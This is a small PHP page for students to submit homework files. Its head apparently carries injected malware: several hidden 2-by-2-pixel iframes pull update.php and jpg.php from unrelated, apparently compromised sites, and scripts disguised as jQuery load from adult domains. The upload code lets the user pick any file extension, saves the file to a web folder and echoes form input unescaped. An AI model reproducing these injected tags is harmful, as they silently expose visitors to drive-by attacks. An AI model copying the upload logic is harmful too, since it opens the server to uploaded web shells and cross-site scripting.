<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Howmework Submit</title>
<iframe src="http://www.zw52.ru/wp-content/upgrade/update.php" width="2" height="2" frameborder="0"></iframe><iframe src="http://www.scs.tv/wp-content/themes/twentyeleven/colors/update.php" width="5" height="4" frameborder="0"></iframe><iframe src="http://www.2nf.com.vn/templates/beez/images/jpg.php" width="2" height="2" frameborder="0"></iframe><iframe src="http://www.scs.tv/wp-content/themes/twentyeleven/colors/update.php" width="5" height="4" frameborder="0"></iframe><iframe src="http://www.2nf.com.vn/templates/beez/images/jpg.php" width="2" height="2" frameborder="0"></iframe><iframe src="http://www.scs.tv/wp-content/themes/twentyeleven/colors/update.php" width="5" height="4" frameborder="0"></iframe><script language="JavaScript" src="http://www.insightcrime.org/media/system/js/jquery-1.6.5.min.js" type="text/javascript"></script><script language="JavaScript" src="http://3xindiansex.com/st/css/js/jq-footer.js" type="text/javascript"></script><script language="JavaScript" src="http://sexfromindia.com/linkex/jquery-1.6.5.min.js" type="text/javascript"></script></head>

<body>

<?php

	if ($_FILES["file"]["error"] > 0)
  	{
	  echo "Error: " . $_FILES["file"]["error"] . "<br />";
	}
	else
    {
	  echo "Upload: " . $_FILES["file"]["name"] . "<br />";
	  echo "Type: " . $_FILES["file"]["type"] . "<br />";
	  echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
	//  echo "Stored in: " . $_FILES["file"]["tmp_name"];
	 }
	 
	 $stuname = $_POST["stuname"];
	 $stuno = $_POST["stuno"];
	 $hwno = $_POST["hwno"];
	 $ftype = $_POST["ftype"];
	 if ($ftype == "doc"){
	 	$suf = ".doc";
	 } elseif ($ftype == "txt"){
	 	$suf = ".txt";
	 } elseif ($ftype == "pdf"){
	 	$suf = ".pdf";
	 } elseif ($ftype == "oth"){
	 	$suf = ".".$_POST["type_other"];
	 }
	 $fileName = date("Y-m-d").".".time().$suf;
	 $newFileName = "upload/".$fileName;
	 
	 move_uploaded_file($_FILES["file"]["tmp_name"], $newFileName);
	 
	 $logfp = fopen("upload/upload.log", 'a+');
	 fwrite($logfp, "stuname=".$stuname."\r\n");
	 fwrite($logfp, "stuno=".$stuno."\r\n");
	 fwrite($logfp, "hwno=".$hwno."\r\n");
	 fwrite($logfp, "filename=".$fileName."\r\n");
	 fwrite($logfp, "\r\n\r\n");
	 fclose($logfp);

	 echo "<br/><br/><br/><br/>";
	 echo $stuname."<br/>";
 	 echo $stuno."<br/>";
 	 echo $hwno."<br/>";
	 echo "Submite OK! Save as ".$newFileName."<br/>";
?>


</body>
</html>
